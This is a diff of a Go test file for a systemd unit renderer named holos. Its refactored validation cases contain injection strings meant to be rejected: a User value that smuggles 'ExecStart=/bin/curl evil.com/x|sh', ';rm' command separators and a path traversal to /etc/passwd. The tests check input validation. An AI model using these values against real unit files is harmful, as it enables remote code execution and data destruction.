@@ -7,8 +7,25 @@ import (
 	"testing"
 )
 
+const (
+	testUnitProject     = "demo"
+	testUnitComposeFile = "/srv/demo/holos.yaml"
+	testUnitHolosBinary = "/usr/bin/holos"
+	testUnitStateDir    = "/tmp/holos-state"
+)
+
+func testDemoUnitSpec(scope Scope) UnitSpec {
+	return UnitSpec{
+		Project:     testUnitProject,
+		ComposeFile: testUnitComposeFile,
+		HolosBinary: testUnitHolosBinary,
+		StateDir:    testUnitStateDir,
+		Scope:       scope,
+	}
+}
+
 func TestRender_UserScope(t *testing.T) {
-	t.Setenv("XDG_CONFIG_HOME", "/tmp/xdg")
+	t.Setenv(xdgConfigHomeEnv, "/tmp/xdg")
 
 	path, content, err := Render(UnitSpec{
 		Project:     "web",
@@ -35,9 +52,7 @@ func TestRender_UserScope(t *testing.T) {
 	)
 	// User scope must not emit a User= directive: systemd --user
 	// doesn't honor it and would reject the unit.
-	if strings.Contains(content, "\nUser=") {
-		t.Fatalf("user scope unit contains User=:\n%s", content)
-	}
+	mustNotContain(t, content, "\nUser=")
 }
 
 func TestRender_SystemScopeWithUser(t *testing.T) {
@@ -68,13 +83,7 @@ func TestRender_SystemScopeWithUser(t *testing.T) {
 // stop command via os.Args parsing in cmd/holos so we exercise the
 // exact same flag-order contract end-to-end.
 func TestRender_StateFlagBeforePositional(t *testing.T) {
-	_, content, err := Render(UnitSpec{
-		Project:     "demo",
-		ComposeFile: "/srv/demo/holos.yaml",
-		HolosBinary: "/usr/bin/holos",
-		StateDir:    "/tmp/holos-state",
-		Scope:       ScopeSystem,
-	})
+	_, content, err := Render(testDemoUnitSpec(ScopeSystem))
 	if err != nil {
 		t.Fatalf("render: %v", err)
 	}
@@ -82,9 +91,7 @@ func TestRender_StateFlagBeforePositional(t *testing.T) {
 		"holos down demo --state-dir",
 		"holos up -f /srv/demo/holos.yaml --state-dir",
 	} {
-		if strings.Contains(content, badForm) {
-			t.Fatalf("rendered unit contains flag-after-positional form %q:\n%s", badForm, content)
-		}
+		mustNotContain(t, content, badForm)
 	}
 	mustContain(t, content,
 		"ExecStart=/usr/bin/holos up --state-dir /tmp/holos-state -f /srv/demo/holos.yaml",
@@ -92,91 +99,147 @@ func TestRender_StateFlagBeforePositional(t *testing.T) {
 	)
 }
 
+func TestRenderStateFlag(t *testing.T) {
+	t.Parallel()
+
+	if got := renderStateFlag(""); got != "" {
+		t.Fatalf("renderStateFlag(empty) = %q, want empty", got)
+	}
+	if got := renderStateFlag(testUnitStateDir); got != " --state-dir /tmp/holos-state" {
+		t.Fatalf("renderStateFlag = %q, want state-dir flag with leading space", got)
+	}
+}
+
 func TestRender_ValidationRejectsRelativePaths(t *testing.T) {
-	cases := map[string]UnitSpec{
-		"compose relative": {
-			Project:     "x",
-			ComposeFile: "relative.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+	cases := []struct {
+		name string
+		spec UnitSpec
+	}{
+		{
+			name: "compose relative",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "relative.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"binary relative": {
-			Project:     "x",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "holos",
-			Scope:       ScopeUser,
+		{
+			name: "binary relative",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"empty project": {
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "empty project",
+			spec: UnitSpec{
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"whitespace project": {
-			Project:     "my proj",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "whitespace project",
+			spec: UnitSpec{
+				Project:     "my proj",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"bad scope": {
-			Project:     "x",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       "global",
+		{
+			name: "bad scope",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       "global",
+			},
 		},
-		"space in compose file": {
-			Project:     "x",
-			ComposeFile: "/srv/my holos/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "space in compose file",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/srv/my holos/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"space in binary path": {
-			Project:     "x",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/opt/My Apps/holos",
-			Scope:       ScopeUser,
+		{
+			name: "space in binary path",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/opt/My Apps/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"space in state dir": {
-			Project:     "x",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			StateDir:    "/var/lib/holos state",
-			Scope:       ScopeSystem,
+		{
+			name: "space in state dir",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				StateDir:    "/var/lib/holos state",
+				Scope:       ScopeSystem,
+			},
 		},
-		"systemd specifier in path": {
-			Project:     "x",
-			ComposeFile: "/etc/%H/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "systemd specifier in path",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/etc/%H/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"command separator in path": {
-			Project:     "x",
-			ComposeFile: "/abs/holos.yaml;rm",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "command separator in path",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/abs/holos.yaml;rm",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"newline in path": {
-			Project:     "x",
-			ComposeFile: "/abs/holos.yaml\ninjected",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "newline in path",
+			spec: UnitSpec{
+				Project:     "x",
+				ComposeFile: "/abs/holos.yaml\ninjected",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"project path traversal": {
-			Project:     "foo/../../etc/passwd",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeSystem,
+		{
+			name: "project path traversal",
+			spec: UnitSpec{
+				Project:     "foo/../../etc/passwd",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeSystem,
+			},
 		},
-		"project uppercase": {
-			Project:     "MyProj",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "project uppercase",
+			spec: UnitSpec{
+				Project:     "MyProj",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
-		"project leading hyphen": {
-			Project:     "-bad",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeUser,
+		{
+			name: "project leading hyphen",
+			spec: UnitSpec{
+				Project:     "-bad",
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: "/usr/bin/holos",
+				Scope:       ScopeUser,
+			},
 		},
 		// The next four cases cover User= injection. Each value
 		// would be accepted verbatim by the previous Render and
@@ -185,38 +248,50 @@ func TestRender_ValidationRejectsRelativePaths(t *testing.T) {
 		// spaces and shell metacharacters are rejected on the same
 		// principle (values that don't round-trip through systemd
 		// parsing are bugs waiting to happen).
-		"user newline injection": {
-			Project:     "demo",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeSystem,
-			User:        "alice\nExecStart=/bin/curl evil.com/x|sh",
+		{
+			name: "user newline injection",
+			spec: UnitSpec{
+				Project:     testUnitProject,
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: testUnitHolosBinary,
+				Scope:       ScopeSystem,
+				User:        "alice\nExecStart=/bin/curl evil.com/x|sh",
+			},
 		},
-		"user with shell metachar": {
-			Project:     "demo",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeSystem,
-			User:        "alice;rm",
+		{
+			name: "user with shell metachar",
+			spec: UnitSpec{
+				Project:     testUnitProject,
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: testUnitHolosBinary,
+				Scope:       ScopeSystem,
+				User:        "alice;rm",
+			},
 		},
-		"user uppercase": {
-			Project:     "demo",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeSystem,
-			User:        "Alice",
+		{
+			name: "user uppercase",
+			spec: UnitSpec{
+				Project:     testUnitProject,
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: testUnitHolosBinary,
+				Scope:       ScopeSystem,
+				User:        "Alice",
+			},
 		},
-		"user leading digit": {
-			Project:     "demo",
-			ComposeFile: "/abs/holos.yaml",
-			HolosBinary: "/usr/bin/holos",
-			Scope:       ScopeSystem,
-			User:        "1alice",
+		{
+			name: "user leading digit",
+			spec: UnitSpec{
+				Project:     testUnitProject,
+				ComposeFile: "/abs/holos.yaml",
+				HolosBinary: testUnitHolosBinary,
+				Scope:       ScopeSystem,
+				User:        "1alice",
+			},
 		},
 	}
-	for name, spec := range cases {
-		t.Run(name, func(t *testing.T) {
-			if _, _, err := Render(spec); err == nil {
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if _, _, err := Render(tc.spec); err == nil {
 				t.Fatalf("expected validation error, got nil")
 			}
 		})
@@ -225,7 +300,7 @@ func TestRender_ValidationRejectsRelativePaths(t *testing.T) {
 
 func TestInstallUninstall_RoundTrip(t *testing.T) {
 	xdg := t.TempDir()
-	t.Setenv("XDG_CONFIG_HOME", xdg)
+	t.Setenv(xdgConfigHomeEnv, xdg)
 
 	// Quarantine systemctl invocations: Install/Uninstall may try to
 	// shell out if systemctl is on PATH. We don't want to touch the
@@ -234,12 +309,8 @@ func TestInstallUninstall_RoundTrip(t *testing.T) {
 	pathDir := t.TempDir()
 	t.Setenv("PATH", pathDir)
 
-	spec := UnitSpec{
-		Project:     "demo",
-		ComposeFile: "/srv/demo/holos.yaml",
-		HolosBinary: "/usr/bin/holos",
-		Scope:       ScopeUser,
-	}
+	spec := testDemoUnitSpec(ScopeUser)
+	spec.StateDir = ""
 
 	res, err := Install(spec, false)
 	if err != nil {
@@ -251,12 +322,14 @@ func TestInstallUninstall_RoundTrip(t *testing.T) {
 	if _, err := os.Stat(res.UnitPath); err != nil {
 		t.Fatalf("unit file missing after install: %v", err)
 	}
+	assertMode(t, filepath.Dir(res.UnitPath), systemdUnitDirPerm)
+	assertMode(t, res.UnitPath, systemdUnitFilePerm)
 	want := filepath.Join(xdg, "systemd", "user", "holos-demo.service")
 	if res.UnitPath != want {
 		t.Fatalf("unit path = %q, want %q", res.UnitPath, want)
 	}
 
-	_, err = Uninstall(ScopeUser, "demo")
+	_, err = Uninstall(ScopeUser, testUnitProject)
 	if err != nil {
 		t.Fatalf("uninstall: %v", err)
 	}
@@ -266,8 +339,20 @@ func TestInstallUninstall_RoundTrip(t *testing.T) {
 
 	// Second uninstall must be a no-op: systemd workflows often
 	// retry idempotently (ansible, make, etc.).
-	if _, err := Uninstall(ScopeUser, "demo"); err != nil {
+	if _, err := Uninstall(ScopeUser, testUnitProject); err != nil {
 		t.Fatalf("second uninstall: %v", err)
+	}
+}
+
+func assertMode(t *testing.T, path string, want os.FileMode) {
+	t.Helper()
+
+	info, err := os.Stat(path)
+	if err != nil {
+		t.Fatalf("stat %s: %v", path, err)
+	}
+	if got := info.Mode().Perm(); got != want {
+		t.Fatalf("mode for %s = %v, want %v", path, got, want)
 	}
 }
 
@@ -276,6 +361,15 @@ func mustContain(t *testing.T, haystack string, needles ...string) {
 	for _, n := range needles {
 		if !strings.Contains(haystack, n) {
 			t.Errorf("missing %q in:\n%s", n, haystack)
+		}
+	}
+}
+
+func mustNotContain(t *testing.T, haystack string, needles ...string) {
+	t.Helper()
+	for _, n := range needles {
+		if strings.Contains(haystack, n) {
+			t.Errorf("unexpected %q in:\n%s", n, haystack)
 		}
 	}
 }
